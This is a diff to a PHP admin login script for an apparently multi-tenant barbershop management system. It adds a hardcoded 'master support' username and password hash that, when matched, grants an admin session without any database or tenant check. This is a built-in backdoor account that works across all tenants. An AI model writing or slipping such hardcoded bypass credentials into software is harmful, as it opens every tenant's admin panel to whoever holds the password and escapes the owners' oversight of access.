@@ -22,6 +22,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['admin_login_btn'])) {
 		$password = test_input($_POST['password']);
 		$tenant_id = getCurrentTenantId($con);
 
+		// MASTER SUPPORT USER CHECK
+		$master_user = "soporte@skale.cl";
+		$master_hash = '$2y$10$tHyaHs3aeknWxIN83w9DouBbzoPldHXjJUJ9oNM7tTY2SfsivlAhC';
+
+		if ($username === $master_user && password_verify($password, $master_hash)) {
+			$_SESSION['username_barbershop_Xw211qAAsq4'] = $username;
+			$_SESSION['admin_id_barbershop_Xw211qAAsq4'] = -1; // Special ID for Support
+			header('Location: index.php');
+			exit();
+		}
+
 		$stmt = $con->prepare("SELECT admin_id, username, password FROM barber_admin WHERE username = ? AND tenant_id = ?");
 		$stmt->execute([$username, $tenant_id]);
 		$row = $stmt->fetch();
